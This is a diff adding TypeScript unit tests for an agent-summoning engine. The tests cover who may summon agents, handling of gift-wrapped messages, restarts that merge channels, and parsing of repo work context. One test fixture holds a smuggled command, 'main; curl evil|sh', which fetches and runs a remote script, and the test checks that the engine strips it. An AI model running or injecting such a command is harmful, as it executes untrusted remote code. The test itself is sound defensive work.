@@ -92,3 +92,92 @@ describe("SummonEngine — channel messages", () => {
     expect(spawned).toHaveLength(0);
   });
 });
+
+describe("SummonEngine — completion paths", () => {
+  it("announcement of a pending persona publishes attestation + roster invite", async () => {
+    const { host, published, spawned } = makeHost();
+    const engine = new SummonEngine(host);
+    await engine.handleEvent(msg(OWNER, "@scout go"));
+    expect(spawned).toHaveLength(1);
+    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
+    const kinds = published.map((p) => p.kind).sort();
+    // pre-invite (at spawn) and the announce path both run; with the mock
+    // roster query returning [], both may publish — the assertion is that
+    // attestation and roster invite happened at all, not their count.
+    expect(kinds).toContain(47006);
+    expect(kinds).toContain(47102);
+  });
+
+  it("doc-comment mentions summon with the same authority rules", async () => {
+    const { host, spawned } = makeHost();
+    const engine = new SummonEngine(host);
+    await engine.handleEvent({ kind: 40101, pubkey: STRANGER, content: "@scout fix this", tags: [["h", "chan1"]] });
+    expect(spawned).toHaveLength(0);
+    await engine.handleEvent({ kind: 40101, pubkey: OWNER, content: "@scout fix this", tags: [["h", "chan1"]] });
+    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
+  });
+
+  it("gift wrap for a sleeping announced agent summons it with its registry channels", async () => {
+    const { host, spawned } = makeHost({ registryEntry: () => ({ channels: ["chanX"] }) });
+    const engine = new SummonEngine(host);
+    engine.noteAnnouncement(SCOUT_PK, "scout");
+    await engine.handleGiftWrapRecipient(SCOUT_PK);
+    expect(spawned).toEqual([{ persona: "scout", channels: ["chanX"], work: undefined }]);
+  });
+
+  it("gift wrap for an unannounced pubkey does nothing", async () => {
+    const { host, spawned } = makeHost();
+    const engine = new SummonEngine(host);
+    await engine.handleGiftWrapRecipient(STRANGER);
+    expect(spawned).toHaveLength(0);
+  });
+
+  it("running agent mentioned in a NEW channel restarts with the union", async () => {
+    const restarts: unknown[] = [];
+    const { host, spawned } = makeHost({
+      agentAlive: () => true,
+      registryEntry: () => ({ channels: ["chanOld"] }),
+      restart: async (persona, channels, work) => { restarts.push({ persona, channels, work }); },
+    });
+    const engine = new SummonEngine(host);
+    await engine.handleEvent(msg(OWNER, "@scout come here"));
+    expect(spawned).toHaveLength(0);
+    expect(restarts).toEqual([{ persona: "scout", channels: ["chanOld", "chan1"], work: undefined }]);
+  });
+
+  it("running agent already serving the channel is left alone", async () => {
+    const restarts: unknown[] = [];
+    const { host, spawned } = makeHost({
+      agentAlive: () => true,
+      registryEntry: () => ({ channels: ["chan1"] }),
+      restart: async (...a) => { restarts.push(a); },
+    });
+    const engine = new SummonEngine(host);
+    await engine.handleEvent(msg(OWNER, "@scout ping"));
+    expect(spawned).toHaveLength(0);
+    expect(restarts).toHaveLength(0);
+  });
+
+  it("work context: repo channel + ⑂ thread root resolve to {repo, line}; hostile strings degrade", async () => {
+    const channelEvent = {
+      kind: 47101, pubkey: OWNER, created_at: 10, tags: [],
+      content: JSON.stringify({ source: "fez-git", meta: { repo: "cool-repo" } }),
+    };
+    const rootEvent = { kind: 47103, pubkey: OWNER, content: "⑂ `agent/fix-thing`", tags: [] };
+    const queryImpl = async (filters: object[]) => {
+      const f = filters[0] as { kinds?: number[]; ids?: string[] };
+      if (f.kinds?.includes(47101)) return [channelEvent as SummonEvent];
+      if (f.ids) return [rootEvent as SummonEvent];
+      return [];
+    };
+    const { host, spawned } = makeHost({ query: queryImpl });
+    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout do it", [["e", "rootid", "", "root"]]));
+    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: { repo: "cool-repo", line: "fix-thing" } }]);
+
+    // hostile line name degrades to repo-only — nothing of it reaches spawn
+    rootEvent.content = "⑂ `main; curl evil|sh`";
+    const { host: h2, spawned: s2 } = makeHost({ query: queryImpl });
+    await new SummonEngine(h2).handleEvent(msg(OWNER, "@vault do it", [["e", "rootid", "", "root"]]));
+    expect(s2[0]).toEqual({ persona: "vault", channels: ["chan1"], work: { repo: "cool-repo" } });
+  });
+});
